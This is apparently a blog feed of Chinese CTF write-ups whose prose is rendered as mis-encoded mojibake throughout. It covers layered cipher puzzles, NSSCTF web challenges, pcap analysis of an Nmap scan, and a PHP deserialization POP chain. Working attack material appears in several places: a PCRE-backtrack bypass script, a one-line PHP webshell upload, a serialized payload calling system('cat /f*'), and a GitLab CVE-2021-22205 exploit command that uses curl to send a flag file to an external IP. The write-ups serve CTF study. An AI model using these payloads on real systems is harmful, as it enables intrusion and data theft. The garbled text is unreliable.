class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="easy-classic"><a href="#easy-classic" class="headerlink" title="easy_classic"></a>easy_classic</h3><p>å¥—å¨ƒé¢˜ï¼Œå¥—éº»äº†</p><p>ç¬¬ä¸€å±‚ï¼Œå‡¯æ’’16</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">udzeojxuwqcu</span><br><span class="line"></span><br><span class="line">enjoythegame</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒå±‚ï¼Œwå‹æ …æ å¯†ç  7</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ialhhooavtepcyr</span><br><span class="line"></span><br><span class="line">ilovecryptohaha</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰å±‚ï¼Œbas64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">5a6H5a6Z5LiH5rOV55qE6YKj5Liq5rqQ5aS0</span><br><span class="line"></span><br><span class="line">å®‡å®™ä¸‡æ³•çš„é‚£ä¸ªæºå¤´</span><br></pre></td></tr></table></figure><p>ç¬¬4å±‚ï¼Œç†Šæ›°è§£å¯†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ç†Šæ›°ï¼šå‘‹é£Ÿé£Ÿé£Ÿå–å™—å±±ç¬¨ç¬¨ç ´å—„å’¯å“ˆå‹•å—¡é›œé¡å—’å˜¿å•½æ²’æ­¡ç ´å–å’¬æˆ‘å•½å¯¶ç›œå™”å’¯æ²’</span><br><span class="line"></span><br><span class="line">never gonna give you up</span><br></pre></td></tr></table></figure><p>ç¬¬5å±‚ï¼Œå…ˆè§£emoji<a href="http://www.atoolbox.net/Tool.php?Id=937%E8%BF%9B%E8%A1%8C%E8%A7%A3%E7%A0%81">http://www.atoolbox.net/Tool.php?Id=937%E8%BF%9B%E8%A1%8C%E8%A7%A3%E7%A0%81</a></p><p><img src="/2023/11/27/give_me_Goerlieth/image/image-20231027142626076-1700993943478-115.png" alt="image-20231027142626076"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ğŸ‘ğŸ‘˜ğŸ‘ ğŸ‘©ğŸ‘ğŸ‘˜ğŸ‘¤ğŸ‘œ</span><br><span class="line"></span><br><span class="line">fairgame</span><br></pre></td></tr></table></figure><p>ä¹‹åPlayfairè§£å¯†<a href="http://www.metools.info/code/playfair_186.html">http://www.metools.info/code/playfair_186.html</a></p><p><img src="/2023/11/27/give_me_Goerlieth/image/image-20231027142702429-1700993943478-116.png" alt="image-20231027142702429"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Ctttttttt</title>
      <link href="/2023/11/21/-Ctttttttt/"/>
      <url>/2023/11/21/-Ctttttttt/</url>
      
        <content type="html"><![CDATA[<p><img src="/2023/11/21/-Ctttttttt/image/image-20231129130149695.png" alt="image-20231129130149695"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å­¦ä¹ ç¬”è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTFé¢˜ç›®ç»ƒä¹ </title>
      <link href="/2023/11/15/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020%5Deasycon/"/>
      <url>/2023/11/15/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020%5Deasycon/</url>
      
        <content type="html"><![CDATA[<h1 id="NSSCTFé¢˜ç›®ç»ƒä¹ "><a href="#NSSCTFé¢˜ç›®ç»ƒä¹ " class="headerlink" title="NSSCTFé¢˜ç›®ç»ƒä¹ "></a>NSSCTFé¢˜ç›®ç»ƒä¹ </h1><h2 id="ç¾ŠåŸæ¯-2020-easycon"><a href="#ç¾ŠåŸæ¯-2020-easycon" class="headerlink" title="[ç¾ŠåŸæ¯ 2020]easycon"></a>[ç¾ŠåŸæ¯ 2020]easycon</h2><p><img src="/2023/11/15/[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]easycon/image/image-20230917120408654-1700014518989-3-1700014609953-9-1700015416328-19-1700989325379-1-1700994157322-1.png"></p><p>å¾¡å‰‘æ‰«åˆ°2ä¸ªç›¸å…³ï¼Œè®¿é—®url&#x2F;index.phpè·³è½¬åˆ°</p><p><img src="/2023/11/15/[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]easycon/image/image-20230917120610438-1700014609945-7-1700989325380-2-1700994157323-2.png"></p><p>ä¹‹åå‡ºç°</p><p><img src="/2023/11/15/[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]easycon/image/image-20230917120504348-1700014609945-8-1700989325380-3-1700994157323-3.png"></p><p>é‚£ä¸ªå¼¹çª—eval post cmdåº”è¯¥æ˜¯æç¤ºï¼Œ</p><p><img src="/2023/11/15/[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]easycon/image/image-20230917120721712-1700989325380-4-1700994157323-5.png"></p><p>æœç„¶ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œæˆ‘ä»¬cmd&#x3D;system(â€œcat b*â€);</p><p>å‘ç°å‡ºç°ä¸€å †ç¼–ç ï¼ŒçŒœæµ‹æ˜¯base64è½¬å›¾ç‰‡ã€‚è½¬æ¢å¾—åˆ°flag</p><p><img src="/2023/11/15/[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]easycon/image/image-20230917120911281-1700989325380-6-1700994157323-4.png"></p><h2 id="NSSRound-1-Basic-basic-check"><a href="#NSSRound-1-Basic-basic-check" class="headerlink" title="[NSSRound#1 Basic]basic_check"></a>[NSSRound#1 Basic]basic_check</h2><p>bpæŠ“åŒ…ï¼Œæ”¹è¯·æ±‚æ–¹å¼ä¸ºPUTï¼Œå†™ä¸ªä¸€å¥è¯æœ¨é©¬</p><p><img src="/2023/11/15/[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]easycon/image/image-20230917121422892-1700989325380-5-1700994157323-6.png"></p><p>å‘ç°1.phpè¢«å†™å…¥æˆåŠŸ</p><p>å›åˆ°ç½‘é¡µè®¿é—®ï¼Œæ‰§è¡Œå‘½ä»¤</p><p><img src="/2023/11/15/[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]easycon/image/image-20230917121538182-1700989325380-7-1700994157323-7.png"></p><p>##[MoeCTF 2022]ezhtml</p><p>æŸ¥çœ‹é¡µé¢æºä»£ç ï¼Œåœ¨evil.jsæ–‡ä»¶é‡Œå‘ç°flag</p><h2 id="NISACTF-2022-middlerce"><a href="#NISACTF-2022-middlerce" class="headerlink" title="[NISACTF 2022]middlerce"></a>[NISACTF 2022]middlerce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$txw4ever</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&amp;|!|\&lt;|\&gt;|\&#123;|\x09|\x0a|\[).*$/m&#x27;</span>,<span class="variable">$txw4ever</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å†åŠ æŠŠæ²¹å–”&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$command</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$txw4ever</span>,<span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">checkdata</span>(<span class="variable">$command</span>);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$command</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é¢˜ç‚¸ä¼¼ä¸€çœ‹å¾ˆç®€å•ï¼Œä¸€é“rceç½¢äº†ï¼Œè¯•äº†è¯•ï¼Œéš¾ä»¥è¨€è¯´ã€‚ã€‚ã€‚ã€‚ã€‚</p><p>è¿™é“é¢˜éœ€è¦ç”¨åˆ°prceå›æº¯ï¼Œæ­£åˆ™åŒ¹é…çš„å›æº¯æ¬¡æ•°æŒ‰è‹±æ–‡ç‰ˆæ¥æœ€å¤§æ­¤æ—¶æ˜¯100ä¸‡ï¼Œå°±æ˜¯è¯´ï¼Œæ­£åˆ™åŒ¹é…ï¼ŒåŒ¹é…100ä¸‡æ¬¡åï¼Œä¾¿ä¸å†åŒ¹é…ï¼Œå¯ä»¥çœ‹è¿™ç‰‡æ–‡ç« <a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p><p>åé¢è¿˜æœ‰ä¸€ä¸ªjson_decodeè§£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$command</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$txw4ever</span>,<span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br></pre></td></tr></table></figure><p>æœ¬åœ°æµ‹è¯•ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;111111&quot;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$command</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$a</span>,<span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$command</span>);</span><br><span class="line"><span class="comment">//string(6) &quot;111111&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å°±æ˜¯è§£ç ä¹‹åä¼šè¿”å›cmdæ‰€å¯¹åº”çš„å­—ç¬¦ä¸²</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">payload=&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?= `tail /f*`?&gt;&quot;,&quot;test&quot;:&quot;&#x27; + &quot;@&quot;*(1000000) + &#x27;&quot;&#125;&#x27;</span><br><span class="line">res = requests.post(&quot;node4.anna.nssctf.cn:28390&quot;, data=&#123;&quot;letter&quot;:payload&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p><img src="/2023/11/15/[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]easycon/image/image-20230917135439689-1700989325380-8-1700994157323-8.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–°å‹è½¦è”ç½‘å®‰å…¨ç½‘ç»œåè®®ç ´è§£ï¼ˆé˜¶æ®µä¸€ï¼‰</title>
      <link href="/2023/11/07/%E6%96%B0%E5%9E%8B%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E7%A0%B4%E8%A7%A3%EF%BC%88%E9%98%B6%E6%AE%B5%E4%B8%80%EF%BC%89/"/>
      <url>/2023/11/07/%E6%96%B0%E5%9E%8B%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E7%A0%B4%E8%A7%A3%EF%BC%88%E9%98%B6%E6%AE%B5%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="æ–°å‹è½¦è”ç½‘å®‰å…¨ç½‘ç»œåè®®ç ´è§£ï¼ˆé˜¶æ®µä¸€ï¼‰"><a href="#æ–°å‹è½¦è”ç½‘å®‰å…¨ç½‘ç»œåè®®ç ´è§£ï¼ˆé˜¶æ®µä¸€ï¼‰" class="headerlink" title="æ–°å‹è½¦è”ç½‘å®‰å…¨ç½‘ç»œåè®®ç ´è§£ï¼ˆé˜¶æ®µä¸€ï¼‰"></a>æ–°å‹è½¦è”ç½‘å®‰å…¨ç½‘ç»œåè®®ç ´è§£ï¼ˆé˜¶æ®µä¸€ï¼‰</h2><p>ä¸‹è½½vpnè®¿é—®åæ˜¯ä¸€ä¸ªgit</p><p>éœ€è¦ç”¨Proxifieré…ç½®ä»£ç†</p><p>é…ç½®ä»£ç†æœåŠ¡</p><p><img src="/2023/11/07/%E6%96%B0%E5%9E%8B%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E7%A0%B4%E8%A7%A3%EF%BC%88%E9%98%B6%E6%AE%B5%E4%B8%80%EF%BC%89/image/image-20231111175609407-1699697773720-4-1699698037625-91-1700990318584-109-1700994516091-83.png" alt="image-20231111175609407"></p><p>é…ç½®ä»£ç†è§„åˆ™</p><p><img src="/2023/11/07/%E6%96%B0%E5%9E%8B%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E7%A0%B4%E8%A7%A3%EF%BC%88%E9%98%B6%E6%AE%B5%E4%B8%80%EF%BC%89/image/image-20231111175746684-1699698037624-88-1700990318584-112-1700994516091-85.png" alt="image-20231111175746684"></p><p>ä¹‹ååˆ©ç”¨è„šæœ¬</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">https://github.com/Al1ex/CVE-2021-22205</span></span><br></pre></td></tr></table></figure><p>æ£€æµ‹æ¼æ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE-2021-22205.py -v true -t http://172.18.0.4/</span><br></pre></td></tr></table></figure><p><img src="/2023/11/07/%E6%96%B0%E5%9E%8B%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E7%A0%B4%E8%A7%A3%EF%BC%88%E9%98%B6%E6%AE%B5%E4%B8%80%EF%BC%89/image/image-20231111175940503-1699698037625-89-1700990318584-110-1700994516091-84.png" alt="image-20231111175940503"></p><p>å­˜åœ¨æ¼æ´</p><p>æ‰§è¡Œå‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE-2021-22205.py -a true -t http://172.18.0.4/ -c &quot;curl -T /home/mping/flag http://123.57.236.154:80&quot;</span><br></pre></td></tr></table></figure><p><img src="/2023/11/07/%E6%96%B0%E5%9E%8B%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E7%A0%B4%E8%A7%A3%EF%BC%88%E9%98%B6%E6%AE%B5%E4%B8%80%EF%BC%89/image/image-20231111180232257-1699698037625-90-1700990318584-111-1700994516091-86.png" alt="image-20231111180232257"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/10/25/%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90/"/>
      <url>/2023/10/25/%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>æµé‡åŒ…åˆ†æ</p><p>http.request.method&#x3D;&#x3D;â€POSTâ€  and  http contains </p><p><img src="/2023/10/25/%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90/image/19154337_6490072934feb23186-1700989364047-32-1700994430832-7.webp" alt="19154337_6490072934feb23186"></p><ol><li><p>é¦–å…ˆç¬¬ä¸€ä¸ªé—®é¢˜æ˜¾è€Œæ˜“è§æ˜¯<code>Nmap</code>çš„ç«¯å£æ‰«æå’ŒæœåŠ¡è¯†åˆ«ï¼Œä¸”<code>tcp contains &quot;nmap&quot;</code>å¯ä»¥æµé‡ä¸­å‘ç°å¾ˆå¤šNmapå…³é”®å­—</p></li><li><p>ä»æµé‡æ•´ä½“æ¥çœ‹ï¼Œå¤§éƒ¨åˆ†æµé‡åŒ…å¹¶æ²¡æœ‰å»ºç«‹èµ·TCPå…¨è¿æ¥ï¼Œæ‰€ä»¥è¿™é‡Œåº”è¯¥æ˜¯<code>TCP SYNæ‰«æ</code>ï¼Œä¹Ÿå«<code>åŠè¿æ¥æ‰«æ</code>æˆ–è€…<code>åŠå¼€æ”¾æ‰«æ</code></p></li><li><p>ä¸€ç›´åœ¨å°è¯•å¯¹å…¶ä»–IPå‘èµ·TCPè¿æ¥çš„æ‰«æçš„IPä¹Ÿæ˜¾è€Œæ˜“è§å°±æ˜¯<code>192.168.0.4</code></p></li><li></li><li><p>TCPæ‰«æç«¯å£ï¼Œå¦‚æœç«¯å£å¼€æ”¾ï¼Œåˆ™æœåŠ¡ç«¯ä¼šè¿”å›<code>SYN + ACK</code>æ ‡å¿—ä½éƒ½å¤„äºSetçŠ¶æ€çš„åŒ…</p></li><li><p><img src="/2023/10/25/%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90/image/resize,m_fixed,w_1184-1700989364047-33-1700994430832-8.webp" alt="ä»ä¸€é“é¢˜åˆ†æNmap SYN/åŠè¿æ¥/åŠå¼€æ”¾æ‰«ææµé‡_TCPåŠè¿æ¥æ‰«æ_02"></p></li><li><p>åˆ©ç”¨è¿‡æ»¤å™¨ï¼š<code>tcp.flags.syn==1 and tcp.flags.ack==1</code>ï¼Œè¿‡æ»¤å‡ºä¸¤ä¸ªæ ‡å¿—ä½éƒ½å¤„äºSetçŠ¶æ€ä¸‹çš„åŒ…ï¼Œç„¶ååŒ…ä¸­çš„æºç«¯å£å³æ˜¯æ‰«æåˆ°çš„å¼€æ”¾ç«¯å£ï¼š<code>80ã€135ã€139ã€445ã€3389ã€3306ã€49157ã€49165ã€49155ã€49154ã€49153ã€49152</code></p></li><li><p><img src="/2023/10/25/%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90/image/resize,m_fixed,w_1184-1698214009015-4-1700989364047-34-1700994430833-9.webp" alt="ä»ä¸€é“é¢˜åˆ†æNmap SYN/åŠè¿æ¥/åŠå¼€æ”¾æ‰«ææµé‡_åŠå¼€æ”¾æ‰«æ_03"></p></li><li></li><li><p><code>tcp contains &quot;Apache&quot;</code>æŸ¥æ‰¾å…³é”®å­—å³å¯åœ¨HTTPå“åº”å¤´ä¸­å‘ç°<code>Apache/2.4.23</code></p></li><li><p><img src="/2023/10/25/%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90/image/resize,m_fixed,w_1184-1700989364047-33-1700994430832-8.webp" alt="ä»ä¸€é“é¢˜åˆ†æNmap SYN/åŠè¿æ¥/åŠå¼€æ”¾æ‰«ææµé‡_TCPåŠè¿æ¥æ‰«æ_04"></p></li></ol><p>nmapå¼€æ”¾ç«¯å£ç­›é€‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp.flags.syn==1 and tcp.flags.ack==1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/10/25/new%20starweek%204/"/>
      <url>/2023/10/25/new%20starweek%204/</url>
      
        <content type="html"><![CDATA[<p>new starweek 4</p><p>?key&#x3D;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadâ€;s:3:â€cmdâ€;s:7:â€cat &#x2F;f*â€;}</p><p>æ‰“å¼€é“¾æ¥ï¼Œå­˜åœ¨å¾ˆå¤šä¸ªç±»ï¼Œå¾ˆæ˜æ˜¾æ˜¯phpååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ï¼Œéœ€è¦æ„é€ popé“¾ ï¼Œ</p><p>å…³äºpopé“¾æ„é€ çš„è¯¦ç»†æ­¥éª¤æ•™å­¦ï¼Œè¯·å‚è€ƒæˆ‘ä¹‹å‰çš„åšå®¢ï¼ŒçœŸçš„è®²å¾—å¾ˆè¯¦ç»†ä¹Ÿå®¹æ˜“ç†è§£ï¼š</p><p><a href="http://t.csdnimg.cn/wMYNB">http://t.csdnimg.cn/wMYNB</a></p><p>å¦‚æœä½ æ˜¯åˆšæ¥è§¦phpååºåˆ—åŒ–åˆ©ç”¨çš„é¢˜ï¼Œé‚£ä¹ˆå»ºè®®å…ˆçœ‹åŸºç¡€çš„åŸç†çŸ¥è¯†ï¼š</p><p><a href="http://t.csdnimg.cn/xhqzq">http://t.csdnimg.cn/xhqzq</a></p><p><a href="http://t.csdnimg.cn/jzQjt">http://t.csdnimg.cn/jzQjt</a></p><p><a href="http://t.csdnimg.cn/IHpEq">http://t.csdnimg.cn/IHpEq</a></p><p>ç”±äºè¿™é“é¢˜è¿˜å‡ºç°äº†</p><p>throw new Exception(â€œNopeâ€);</p><p>è¿™ä¸ªthrowå°±æ˜¯GCå›æ”¶ï¼ˆåƒåœ¾å›æ”¶æœºåˆ¶ï¼‰ï¼Œè¿™é‡Œéœ€è¦ç»•è¿‡å®ƒã€‚</p><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“ï¼š</p><p>åœ¨phpä¸­ï¼Œå½“å¯¹è±¡è¢«é”€æ¯æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨__destruct()æ–¹æ³•ï¼Œä½†å¦‚æœç¨‹åºæŠ¥é”™æˆ–è€…æŠ›å‡ºå¼‚å¸¸ï¼Œå°±ä¸ä¼šè§¦å‘è¯¥é­”æœ¯æ–¹æ³•ã€‚</p><p>å½“ä¸€ä¸ªç±»åˆ›å»ºä¹‹åå®ƒä¼šè‡ªå·±æ¶ˆå¤±ï¼Œè€Œ __destruct() é­”æœ¯æ–¹æ³•çš„è§¦å‘æ¡ä»¶å°±æ˜¯ä¸€ä¸ªç±»è¢«é”€æ¯æ—¶è§¦å‘ï¼Œè€Œthrowé‚£ä¸ªå‡½æ•°å°±æ˜¯å›æ”¶äº†è‡ªåŠ¨é”€æ¯çš„ç±»ï¼Œå¯¼è‡´destructæ£€æµ‹ä¸åˆ°æœ‰ä¸œè¥¿é”€æ¯ï¼Œä»è€Œä¹Ÿå°±å¯¼è‡´æ— æ³•è§¦å‘destructå‡½æ•°ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æå‰è§¦å‘åƒåœ¾å›æ”¶æœºåˆ¶æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œä»è€Œç»•è¿‡GCå›æ”¶ï¼Œå”¤é†’__destruct()é­”æœ¯æ–¹æ³•ã€‚</p><p>è§¦å‘åƒåœ¾å›æ”¶æœºåˆ¶çš„æ–¹æ³•æœ‰ï¼šï¼ˆæœ¬è´¨å³ä½¿å¯¹è±¡å¼•ç”¨è®¡æ•°å½’é›¶ï¼‰</p><p>ï¼ˆ1ï¼‰å¯¹è±¡è¢«unset()å¤„ç†æ—¶ï¼Œå¯ä»¥è§¦å‘ã€‚</p><p>ï¼ˆ2ï¼‰æ•°ç»„å¯¹è±¡ä¸ºNULLæ—¶ï¼Œå¯ä»¥è§¦å‘ã€‚</p><p>æˆ‘ä»¬å…ˆæ­£å¸¸æ„é€ popé“¾ï¼š</p><p>å…³äºpopé“¾çš„æ„é€ å’Œæ ‡æ³¨çœŸçš„çœ‹æˆ‘ä¹‹å‰é‚£ç¯‡åšå®¢è‚¯å®šèƒ½æ‡‚</p><pre><code>&lt;?php class Start&#123;    public $errMsg;  // 5 Crypto    public function __destruct() &#123;        die($this-&gt;errMsg);      &#125;&#125; class Pwn&#123;    public $obj;   // 2 Web    public function __invoke()&#123;        $this-&gt;obj-&gt;evil();    &#125;    public function evil() &#123;        phpinfo();    &#125;&#125; class Reverse&#123;    public $func;  // 3 Pwn    public function __get($var) &#123;        ($this-&gt;func)();    &#125;&#125; class Web&#123;     public $func; // 1 system    public $var;  // 1 cat /f*    public function evil() &#123;        if(!preg_match(&quot;/flag/i&quot;,$this-&gt;var))&#123;            ($this-&gt;func)($this-&gt;var);        &#125;else&#123;            echo &quot;Not Flag&quot;;        &#125;    &#125;&#125; class Crypto&#123;    public $obj;  // 4 Reverse    public function __toString() &#123;        $wel = $this-&gt;obj-&gt;good;        return &quot;NewStar&quot;;    &#125;&#125; class Misc&#123;      public function evil() &#123;        echo &quot;good job but nothing&quot;;    &#125;&#125; $w = new Web();$w-&gt;func = &#39;system&#39;;$w-&gt;var = &#39;cat /f*&#39;;$p = new Pwn();$p-&gt;obj = $w;$r = new Reverse();$r-&gt;func = $p;$c = new Crypto();$c-&gt;obj = $r;$s = new Start();$s-&gt;errMsg = $c;echo serialize($s); ?&gt;</code></pre><p>æˆ‘ä»¬ä½¿ç”¨ç¬¬äºŒä¸­æ–¹æ³•ï¼ˆæ•°ç»„å¯¹è±¡ä¸ºNULLï¼‰ç»•è¿‡GCå›æ”¶ï¼š</p><pre><code>&lt;?php class Start&#123;    public $errMsg;  // 5 Crypto    public function __destruct() &#123;        die($this-&gt;errMsg);      &#125;&#125; class Pwn&#123;    public $obj;   // 2 Web    public function __invoke()&#123;        $this-&gt;obj-&gt;evil();    &#125;    public function evil() &#123;        phpinfo();    &#125;&#125; class Reverse&#123;    public $func;  // 3 Pwn    public function __get($var) &#123;        ($this-&gt;func)();    &#125;&#125; class Web&#123;     public $func; // 1 system    public $var;  // 1 cat /f*    public function evil() &#123;        if(!preg_match(&quot;/flag/i&quot;,$this-&gt;var))&#123;            ($this-&gt;func)($this-&gt;var);        &#125;else&#123;            echo &quot;Not Flag&quot;;        &#125;    &#125;&#125; class Crypto&#123;    public $obj;  // 4 Reverse    public function __toString() &#123;        $wel = $this-&gt;obj-&gt;good;        return &quot;NewStar&quot;;    &#125;&#125; class Misc&#123;      public function evil() &#123;        echo &quot;good job but nothing&quot;;    &#125;&#125; $w = new Web();$w-&gt;func = &#39;system&#39;;$w-&gt;var = &#39;cat /f*&#39;;$p = new Pwn();$p-&gt;obj = $w;$r = new Reverse();$r-&gt;func = $p;$c = new Crypto();$c-&gt;obj = $r;$s = new Start();$s-&gt;errMsg = $c; $b=array($s,0);echo serialize($b);  ?&gt;</code></pre><p><img src="/2023/10/25/new%20starweek%204/image/image-20231025095940311-1700990426090-221-1700994600468-195.png" alt="image-20231025095940311"></p><p>è¿è¡Œå¾—åˆ°ï¼š</p><p>a:2:{i:0;O:5:â€Startâ€:1:{s:6:â€errMsgâ€;O:6:â€Cryptoâ€:1:{s:3:â€objâ€;O:7:â€Reverseâ€:1:{s:4:â€funcâ€;O:3:â€Pwnâ€:1:{s:3:â€objâ€;O:3:â€Webâ€:2:{s:4:â€funcâ€;s:6:â€systemâ€;s:3:â€varâ€;s:7:â€cat &#x2F;f*â€;}}}}}i:1;i:0;} </p><p>æˆ‘ä»¬å°†æœ€åçš„ i:1 æ›¿æ¢ä¸º i:0</p><p>å³ï¼š</p><p>a:2:{i:0;O:5:â€Startâ€:1:{s:6:â€errMsgâ€;O:6:â€Cryptoâ€:1:{s:3:â€objâ€;O:7:â€Reverseâ€:1:{s:4:â€funcâ€;O:3:â€Pwnâ€:1:{s:3:â€objâ€;O:3:â€Webâ€:2:{s:4:â€funcâ€;s:6:â€systemâ€;s:3:â€varâ€;s:7:â€cat &#x2F;f*â€;}}}}}i:0;i:0;} </p><p>æ„é€ 